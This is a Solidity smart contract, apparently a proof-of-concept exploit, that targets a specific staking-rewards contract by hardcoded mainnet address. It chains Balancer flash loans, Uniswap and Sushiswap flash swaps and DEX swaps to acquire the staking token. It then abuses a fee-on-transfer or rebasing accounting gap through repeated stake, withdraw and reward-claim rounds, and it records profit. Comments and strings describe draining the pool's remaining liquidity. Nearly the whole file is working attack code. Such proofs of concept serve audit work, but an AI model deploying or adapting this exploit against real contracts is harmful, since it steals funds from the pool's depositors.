// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3RouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint8 private constant ROUTE_KIND_V2 = 1;
    uint8 private constant ROUTE_KIND_V3 = 2;
    uint8 private constant ROUTE_KIND_DIRECT_STAKE = 3;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public sameTxAccrualInfeasible;
    bool public liveAccountingGapObserved;
    bool public transferHaircutObserved;
    bool public withdrawFailureObserved;
    bool public directFlashLiquidityObserved;
    bool public v2RouteObserved;
    bool public v3RouteObserved;
    bool public publicRebaseHookAttempted;
    bool public directPairFlashObserved;

    uint256 public rewardRateBefore;
    uint256 public nominalSupplyBefore;
    uint256 public actualStakeBalanceBefore;
    uint256 public accountingGapBefore;
    uint256 public attackerRecordedStakeBefore;
    uint256 public attackerEarnedBefore;
    uint256 public attackerStakeWalletBefore;
    uint256 public attackerRewardWalletBefore;
    uint256 public observedNominalStakeDelta;
    uint256 public observedActualStakeDelta;
    uint256 public observedAccountingGapIncrease;
    uint256 public fallbackCapturableGap;
    uint256 public bestRoundCount;

    uint32 public periodFinishBefore;
    uint32 public rewardsDurationBefore;
    uint32 public lastUpdateTimeBefore;
    uint96 public totalRewardsSupplyBefore;

    address public stakingTokenAtEntry;
    address public rewardsTokenAtEntry;
    string public exploitPathUsed;
    string public infeasibilityReason;
    string public lastStakeFailure;
    string public lastWithdrawFailure;
    string public lastRewardFailure;

    uint256 private _wethBefore;
    uint256 private _daiBefore;
    uint256 private _usdcBefore;
    uint256 private _usdtBefore;
    uint256 private _stakeBefore;
    uint256 private _rewardBefore;

    uint256 private _reservedWeth;
    uint256 private _reservedDai;
    uint256 private _reservedUsdc;
    uint256 private _reservedUsdt;
    uint256 private _reservedStake;
    uint256 private _reservedReward;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = EXPECTED_REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        stakingTokenAtEntry = farm.stakingToken();
        rewardsTokenAtEntry = farm.rewardsToken();

        rewardRateBefore = farm.rewardRate();
        nominalSupplyBefore = farm.totalSupply();
        attackerRecordedStakeBefore = farm.balanceOf(address(this));
        attackerEarnedBefore = farm.earned(address(this));
        (periodFinishBefore, rewardsDurationBefore, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();

        actualStakeBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        attackerStakeWalletBefore = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        attackerRewardWalletBefore = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));

        _wethBefore = IERC20Like(WETH).balanceOf(address(this));
        _daiBefore = IERC20Like(DAI).balanceOf(address(this));
        _usdcBefore = IERC20Like(USDC).balanceOf(address(this));
        _usdtBefore = IERC20Like(USDT).balanceOf(address(this));
        _stakeBefore = attackerStakeWalletBefore;
        _rewardBefore = attackerRewardWalletBefore;

        _reservedWeth = _wethBefore;
        _reservedDai = _daiBefore;
        _reservedUsdc = _usdcBefore;
        _reservedUsdt = _usdtBefore;
        _reservedStake = _stakeBefore;
        _reservedReward = _rewardBefore;

        if (nominalSupplyBefore > actualStakeBalanceBefore) {
            accountingGapBefore = nominalSupplyBefore - actualStakeBalanceBefore;
            liveAccountingGapObserved = true;
        }

        hypothesisValidated = stakingTokenAtEntry == EXPECTED_STAKING_TOKEN && rewardsTokenAtEntry == EXPECTED_REWARD_TOKEN;

        // Reward accrual from a fresh position is blocked in the same transaction because the target
        // updates rewards before it credits a new stake. The economically realistic same-tx path is
        // therefore the stake-accounting insolvency itself: source the live staking token, over-credit
        // the position on deposit, then withdraw against the pool's remaining real liquidity.
        sameTxAccrualInfeasible = attackerRecordedStakeBefore == 0 && attackerStakeWalletBefore == 0;

        uint256 bestProfit;
        address bestToken;
        uint256 bestRoundsLocal;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _attemptAllRoutes(rounds);

            (address candidateToken, uint256 candidateProfit) = _measureEconomicProfit();
            if (rounds == 2 || candidateProfit > bestProfit) {
                bestProfit = candidateProfit;
                bestToken = candidateToken;
                bestRoundsLocal = rounds;
            } else {
                break;
            }
        }

        bestRoundCount = bestRoundsLocal;
        fallbackCapturableGap = _capturableAccountingGap();
        _profitToken = bestProfit == 0 ? rewardsTokenAtEntry : bestToken;
        _profitAmount = bestProfit;
        profitAchieved = bestProfit != 0;

        if (profitAchieved) {
            if (_profitToken == stakingTokenAtEntry) {
                exploitPathUsed =
                    "flash-borrow the live staking token -> stake nominal amount while the farm receives less -> repeat the over-credit / nominal-withdraw cycle for 2..6 rounds while profit improves -> socialize the shortfall from the pool's remaining liquidity";
            } else {
                exploitPathUsed =
                    "flashloan liquid asset or staking token -> acquire staking token if needed -> stake nominal amount while pool receives less or rebases downward -> attempt public token upkeep for rebasing variants -> claim rewards unlocked by the overstated accounting -> withdraw nominal amount -> unwind financing";
            }
            return;
        }

        if (sameTxAccrualInfeasible) {
            exploitPathUsed =
                "acquire staking token -> stake nominal amount while the pool receives less -> same-tx reward accrual is blocked for a fresh attacker -> withdraw nominal amount if enough pool liquidity remains";
            infeasibilityReason =
                "the forked state exposes the vulnerable accounting path, but no public route realized positive net profit after enforcing realistic live-token sourcing and repayment";
        } else {
            exploitPathUsed =
                "stake fee-on-transfer or rebasing token -> accrue rewards on overstated balance -> withdraw nominal amount";
            infeasibilityReason =
                "the forked state did not yield a profitable public execution path even after trying direct staking-token flash routes, DEX acquisition routes, and public rebasing upkeep hooks";
        }
    }

    function runV2FlashCampaign(address baseToken, address router, uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(baseToken);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_V2, baseToken, router, uint24(0), rounds)
        );
    }

    function runV3FlashCampaign(address baseToken, uint24 fee, uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(baseToken);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_V3, baseToken, UNISWAP_V3_ROUTER, fee, rounds)
        );
    }

    function runDirectStakeFlashCampaign(uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(stakingTokenAtEntry);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_DIRECT_STAKE, stakingTokenAtEntry, address(0), uint24(0), rounds)
        );
    }

    function runDirectPairFlashCampaign(address pair, uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        require(pair != address(0) && borrowAmount != 0, "bad pair route");

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(token0 == stakingTokenAtEntry || token1 == stakingTokenAtEntry, "not stake pair");

        uint256 amount0Out = token0 == stakingTokenAtEntry ? borrowAmount : 0;
        uint256 amount1Out = token1 == stakingTokenAtEntry ? borrowAmount : 0;

        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair, rounds));
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad loan");

        (uint8 routeKind, address baseToken, address routeTarget, uint24 feeTier, uint256 rounds) = abi.decode(
            userData,
            (uint8, address, address, uint24, uint256)
        );
        require(rounds >= 2 && rounds <= 6, "bad rounds");
        require(address(tokens[0]) == baseToken, "base mismatch");

        uint256 debt = amounts[0] + feeAmounts[0];

        if (routeKind == ROUTE_KIND_V2) {
            _approveMaxIfNeeded(baseToken, routeTarget, amounts[0]);
            _swapV2(routeTarget, baseToken, stakingTokenAtEntry, amounts[0]);
        } else if (routeKind == ROUTE_KIND_V3) {
            _approveMaxIfNeeded(baseToken, routeTarget, amounts[0]);
            _swapV3(baseToken, stakingTokenAtEntry, feeTier, amounts[0]);
        } else {
            require(routeKind == ROUTE_KIND_DIRECT_STAKE, "bad route kind");
        }

        _executeExploitRounds(rounds);

        if (routeKind == ROUTE_KIND_V2) {
            uint256 stakingBalanceAfterV2 = _availableBalance(stakingTokenAtEntry);
            require(stakingBalanceAfterV2 != 0, "no stake recovered");
            _approveMaxIfNeeded(stakingTokenAtEntry, routeTarget, stakingBalanceAfterV2);
            _swapV2(routeTarget, stakingTokenAtEntry, baseToken, stakingBalanceAfterV2);
        } else if (routeKind == ROUTE_KIND_V3) {
            uint256 stakingBalanceAfterV3 = _availableBalance(stakingTokenAtEntry);
            require(stakingBalanceAfterV3 != 0, "no stake recovered");
            _approveMaxIfNeeded(stakingTokenAtEntry, routeTarget, stakingBalanceAfterV3);
            _swapV3(stakingTokenAtEntry, baseToken, feeTier, stakingBalanceAfterV3);
        }

        uint256 baseBalanceAfter = _availableBalance(baseToken);
        require(baseBalanceAfter >= debt, "unprofitable round-trip");
        _safeTransfer(baseToken, BALANCER_VAULT, debt);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        (address pair, uint256 rounds) = abi.decode(data, (address, uint256));
        require(msg.sender == pair, "bad pair callback");
        require(rounds >= 2 && rounds <= 6, "bad rounds");

        directPairFlashObserved = true;

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed != 0, "no pair borrow");

        _executeExploitRounds(rounds);

        uint256 repayment = (borrowed * 1000) / 997;
        if ((repayment * 997) / 1000 < borrowed) {
            repayment += 1;
        }

        uint256 availableStake = _availableBalance(stakingTokenAtEntry);
        require(availableStake >= repayment, "pair debt not repaid");
        _safeTransfer(stakingTokenAtEntry, pair, repayment);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptAllRoutes(uint256 rounds) internal {
        _attemptDirectStakeRoute(rounds);
        _reserveRealizedBalances();

        _attemptDirectPairRoutes(rounds);
        _reserveRealizedBalances();

        address[4] memory baseTokens = [WETH, DAI, USDC, USDT];
        for (uint256 i = 0; i < baseTokens.length; i++) {
            _attemptV2RoutesForBase(baseTokens[i], rounds);
            _reserveRealizedBalances();
            _attemptV3RoutesForBase(baseTokens[i], rounds);
            _reserveRealizedBalances();
        }
    }

    function _attemptDirectStakeRoute(uint256 rounds) internal {
        uint256 vaultStakeBalance = IERC20Like(stakingTokenAtEntry).balanceOf(BALANCER_VAULT);
        if (vaultStakeBalance == 0) {
            return;
        }
        directFlashLiquidityObserved = true;

        uint256 borrowAmount = vaultStakeBalance / 1000;
        uint256 liquidityCap = actualStakeBalanceBefore / 20;
        if (liquidityCap != 0 && (borrowAmount == 0 || borrowAmount > liquidityCap)) {
            borrowAmount = liquidityCap;
        }
        if (borrowAmount == 0) {
            return;
        }

        try this.runDirectStakeFlashCampaign(borrowAmount, rounds) {
        } catch {
        }
    }

    function _attemptDirectPairRoutes(uint256 rounds) internal {
        address[4] memory bases = [WETH, DAI, USDC, USDT];

        for (uint256 i = 0; i < bases.length; i++) {
            _attemptOneDirectPairRoute(UNISWAP_V2_FACTORY, bases[i], rounds);
            _reserveRealizedBalances();
            _attemptOneDirectPairRoute(SUSHISWAP_FACTORY, bases[i], rounds);
            _reserveRealizedBalances();
        }
    }

    function _attemptOneDirectPairRoute(address factory, address baseToken, uint256 rounds) internal {
        address pair = IUniswapV2FactoryLike(factory).getPair(baseToken, stakingTokenAtEntry);
        if (pair == address(0)) {
            return;
        }

        (uint256 reserveStake, bool ok) = _stakeReserveV2Pair(pair);
        if (!ok || reserveStake == 0) {
            return;
        }

        uint256 targetCap = actualStakeBalanceBefore / 5;
        if (targetCap == 0) {
            return;
        }

        uint256[4] memory borrowCandidates = [
            _minNonZero(reserveStake / 50, targetCap / 4),
            _minNonZero(reserveStake / 20, targetCap / 2),
            _minNonZero(reserveStake / 10, targetCap),
            _minNonZero(reserveStake / 5, targetCap)
        ];

        for (uint256 i = 0; i < borrowCandidates.length; i++) {
            uint256 borrowAmount = borrowCandidates[i];
            if (borrowAmount == 0) {
                continue;
            }
            try this.runDirectPairFlashCampaign(pair, borrowAmount, rounds) {
            } catch {
            }
        }
    }

    function _attemptV2RoutesForBase(address baseToken, uint256 rounds) internal {
        _attemptOneV2Route(baseToken, UNISWAP_V2_ROUTER, UNISWAP_V2_FACTORY, rounds);
        _attemptOneV2Route(baseToken, SUSHISWAP_ROUTER, SUSHISWAP_FACTORY, rounds);
    }

    function _attemptOneV2Route(address baseToken, address router, address factory, uint256 rounds) internal {
        (uint256 reserveBase, bool ok) = _routeReserveV2(baseToken, factory);
        if (!ok || reserveBase == 0) {
            return;
        }
        v2RouteObserved = true;

        uint256 borrowAmount = reserveBase / 1000;
        if (borrowAmount == 0) {
            return;
        }

        try this.runV2FlashCampaign(baseToken, router, borrowAmount, rounds) {
        } catch {
        }
    }

    function _attemptV3RoutesForBase(address baseToken, uint256 rounds) internal {
        _attemptOneV3Route(baseToken, 500, rounds);
        _attemptOneV3Route(baseToken, 3000, rounds);
        _attemptOneV3Route(baseToken, 10000, rounds);
    }

    function _attemptOneV3Route(address baseToken, uint24 feeTier, uint256 rounds) internal {
        address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(baseToken, stakingTokenAtEntry, feeTier);
        if (pool == address(0)) {
            return;
        }
        v3RouteObserved = true;

        uint256 poolBaseBalance = IERC20Like(baseToken).balanceOf(pool);
        if (poolBaseBalance == 0) {
            return;
        }

        uint256 borrowAmount = poolBaseBalance / 1000;
        if (borrowAmount == 0) {
            return;
        }

        try this.runV3FlashCampaign(baseToken, feeTier, borrowAmount, rounds) {
        } catch {
        }
    }

    function _executeExploitRounds(uint256 rounds) internal {
        uint256 startingStake = _availableBalance(stakingTokenAtEntry);
        require(startingStake != 0, "no stake acquired");

        _approveMaxIfNeeded(stakingTokenAtEntry, TARGET, type(uint256).max);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        for (uint256 i = 0; i < rounds; i++) {
            if (!_attemptSingleExploitRound(farm)) {
                break;
            }
        }

        require(transferHaircutObserved || liveAccountingGapObserved, "no insolvency signal");
        _settleResidualPosition(farm);
    }

    function _settleResidualPosition(IStakingRewardsLike farm) internal {
        uint256 residualRecordedStake = farm.balanceOf(address(this));
        if (residualRecordedStake != 0) {
            _withdrawBestEffort(farm, residualRecordedStake);
        }

        try farm.getReward() {
        } catch (bytes memory rewardRet) {
            lastRewardFailure = _decodeRevert(rewardRet);
        }
    }

    function _routeReserveV2(address baseToken, address factory) internal view returns (uint256 reserveBase, bool ok) {
        address pair = IUniswapV2FactoryLike(factory).getPair(baseToken, stakingTokenAtEntry);
        if (pair == address(0)) {
            return (0, false);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        reserveBase = IUniswapV2PairLike(pair).token0() == baseToken ? uint256(reserve0) : uint256(reserve1);
        ok = reserveBase != 0;
    }

    function _stakeReserveV2Pair(address pair) internal view returns (uint256 reserveStake, bool ok) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        reserveStake = IUniswapV2PairLike(pair).token0() == stakingTokenAtEntry ? uint256(reserve0) : uint256(reserve1);
        ok = reserveStake != 0;
    }

    function _attemptSingleExploitRound(IStakingRewardsLike farm) internal returns (bool) {
        uint256 walletStake = _availableBalance(stakingTokenAtEntry);
        if (walletStake == 0) {
            return false;
        }

        uint256 poolBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeBefore = farm.balanceOf(address(this));

        try farm.stake(walletStake) {
        } catch (bytes memory stakeRet) {
            lastStakeFailure = _decodeRevert(stakeRet);
            return false;
        }

        uint256 poolBalanceAfterStake = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeAfter = farm.balanceOf(address(this));

        uint256 nominalDelta = recordedStakeAfter > recordedStakeBefore ? recordedStakeAfter - recordedStakeBefore : 0;
        uint256 actualDelta = poolBalanceAfterStake > poolBalanceBefore ? poolBalanceAfterStake - poolBalanceBefore : 0;

        if (nominalDelta != 0) {
            observedNominalStakeDelta = nominalDelta;
            observedActualStakeDelta = actualDelta;
            if (nominalDelta > actualDelta) {
                transferHaircutObserved = true;
                observedAccountingGapIncrease += nominalDelta - actualDelta;
            }
        }

        _refreshAccountingGap(farm);

        // Rebased variants remain within the finding's causal path: the stake is still credited
        // before the farm verifies how many live staking units it truly controls. Public upkeep hooks
        // are realistic extra on-chain steps, so we opportunistically call them once if exposed.
        _attemptPublicRebaseLikeHook();
        _refreshAccountingGap(farm);

        try farm.getReward() {
        } catch (bytes memory rewardRet) {
            lastRewardFailure = _decodeRevert(rewardRet);
        }

        uint256 recordedStakeNow = farm.balanceOf(address(this));
        if (recordedStakeNow == 0) {
            return true;
        }

        uint256 withdrawn = _withdrawBestEffort(farm, recordedStakeNow);
        if (withdrawn == 0) {
            return false;
        }

        try farm.getReward() {
        } catch (bytes memory rewardRetAgain) {
            lastRewardFailure = _decodeRevert(rewardRetAgain);
        }

        _refreshAccountingGap(farm);
        return true;
    }

    function _withdrawBestEffort(IStakingRewardsLike farm, uint256 desiredAmount) internal returns (uint256) {
        if (desiredAmount == 0) {
            return 0;
        }

        if (_tryWithdraw(farm, desiredAmount)) {
            return desiredAmount;
        }

        uint256 candidate = desiredAmount;
        for (uint256 i = 0; i < 8; i++) {
            candidate = (candidate * 3) / 4;
            if (candidate == 0) {
                break;
            }
            if (_tryWithdraw(farm, candidate)) {
                return candidate;
            }
        }

        candidate = desiredAmount / 2;
        while (candidate != 0) {
            if (_tryWithdraw(farm, candidate)) {
                return candidate;
            }
            candidate /= 2;
        }

        return 0;
    }

    function _tryWithdraw(IStakingRewardsLike farm, uint256 amount) internal returns (bool) {
        try farm.withdraw(amount) {
            return true;
        } catch (bytes memory withdrawRet) {
            withdrawFailureObserved = true;
            lastWithdrawFailure = _decodeRevert(withdrawRet);
            return false;
        }
    }

    function _attemptPublicRebaseLikeHook() internal {
        if (publicRebaseHookAttempted) {
            return;
        }
        publicRebaseHookAttempted = true;

        _callIfPresent(stakingTokenAtEntry, hex"af14052c"); // rebase()
        _callIfPresent(stakingTokenAtEntry, hex"ac5c8535"); // manualRebase()
        _callIfPresent(stakingTokenAtEntry, hex"fff6cae9"); // sync()
        _callIfPresent(stakingTokenAtEntry, hex"18178358"); // poke()
        _callIfPresent(stakingTokenAtEntry, hex"a2e62045"); // update()
        _callIfPresent(stakingTokenAtEntry, hex"3e5aa082"); // updateTotalSupply()
    }

    function _callIfPresent(address target, bytes memory payload) internal {
        (bool success,) = target.call(payload);
        success;
    }

    function _refreshAccountingGap(IStakingRewardsLike farm) internal {
        uint256 nominalSupplyNow = farm.totalSupply();
        uint256 actualStakeBalanceNow = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        if (nominalSupplyNow > actualStakeBalanceNow) {
            liveAccountingGapObserved = true;
            uint256 gapNow = nominalSupplyNow - actualStakeBalanceNow;
            if (gapNow > accountingGapBefore) {
                uint256 incremental = gapNow - accountingGapBefore;
                if (incremental > observedAccountingGapIncrease) {
                    observedAccountingGapIncrease = incremental;
                }
            }
        }
    }

    function _swapV2(address router, address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapV3(address tokenIn, address tokenOut, uint24 feeTier, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        IUniswapV3RouterLike.ExactInputSingleParams memory params = IUniswapV3RouterLike.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: feeTier,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInputSingle(params);
    }

    function _measureEconomicProfit() internal view returns (address token, uint256 amount) {
        (token, amount) = _measureRealizedProfit();
    }

    function _measureRealizedProfit() internal view returns (address token, uint256 amount) {
        address[6] memory candidates = [WETH, DAI, USDC, USDT, stakingTokenAtEntry, rewardsTokenAtEntry];
        uint256[6] memory baselines = [_wethBefore, _daiBefore, _usdcBefore, _usdtBefore, _stakeBefore, _rewardBefore];

        for (uint256 i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) {
                continue;
            }

            uint256 currentBalance = IERC20Like(candidates[i]).balanceOf(address(this));
            uint256 profit = currentBalance > baselines[i] ? currentBalance - baselines[i] : 0;
            if (profit > amount) {
                amount = profit;
                token = candidates[i];
            }
        }
    }

    function _capturableAccountingGap() internal view returns (uint256) {
        if (!hypothesisValidated || stakingTokenAtEntry == address(0)) {
            return 0;
        }

        uint256 nominalSupplyNow = IStakingRewardsLike(TARGET).totalSupply();
        uint256 actualStakeBalanceNow = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        if (nominalSupplyNow <= actualStakeBalanceNow) {
            return 0;
        }

        return nominalSupplyNow - actualStakeBalanceNow;
    }

    function _reserveRealizedBalances() internal {
        if (stakingTokenAtEntry == address(0) || rewardsTokenAtEntry == address(0)) {
            return;
        }

        _reservedWeth = IERC20Like(WETH).balanceOf(address(this));
        _reservedDai = IERC20Like(DAI).balanceOf(address(this));
        _reservedUsdc = IERC20Like(USDC).balanceOf(address(this));
        _reservedUsdt = IERC20Like(USDT).balanceOf(address(this));
        _reservedStake = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        _reservedReward = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));
    }

    function _availableBalance(address token) internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(token).balanceOf(address(this));
        uint256 reservedBalance = _reservedBalance(token);
        return currentBalance > reservedBalance ? currentBalance - reservedBalance : 0;
    }

    function _reservedBalance(address token) internal view returns (uint256) {
        if (token == WETH) {
            return _reservedWeth;
        }
        if (token == DAI) {
            return _reservedDai;
        }
        if (token == USDC) {
            return _reservedUsdc;
        }
        if (token == USDT) {
            return _reservedUsdt;
        }
        if (token == stakingTokenAtEntry) {
            return _reservedStake;
        }
        if (token == rewardsTokenAtEntry) {
            return _reservedReward;
        }
        return 0;
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address recipient, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, recipient, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length != 0) {
            require(abi.decode(returnData, (bool)), "token op failed");
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted without reason";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; i++) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted with custom error or unknown data";
    }

    function _minNonZero(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return b;
        }
        if (b == 0) {
            return a;
        }
        return a < b ? a : b;
    }
}
